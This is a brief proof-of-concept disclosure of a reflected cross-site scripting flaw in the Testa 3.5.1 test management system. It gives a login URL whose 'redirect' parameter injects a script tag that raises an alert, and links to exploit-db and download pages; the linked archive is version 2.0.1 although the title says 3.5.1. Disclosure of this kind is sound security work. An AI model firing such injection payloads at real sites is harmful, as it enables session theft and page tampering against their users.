## Testa 3.5.1 (Xss)
```diff

@@Testa 3.5.1 Online Test Management System (Cross Site Scripting)@@

+ Version: 3.5.1
- Tested on Linux/Windows
# POC (Piye om carane)
! https://localhost/login.php?redirect=%22%3E%3Cscript%3Ealert(%22evil.com%22)%3C/script%3E
```

## Software & Reference
###### [https://www.exploit-db.com/exploits/51023](https://www.exploit-db.com/exploits/51023)
###### [https://download.aftab.cc/products/testa/Testa_wos_2.0.1.zip](https://download.aftab.cc/products/testa/Testa_wos_2.0.1.zip)
###### [https://www.apachefriends.org/download.html](https://www.apachefriends.org/download.html)
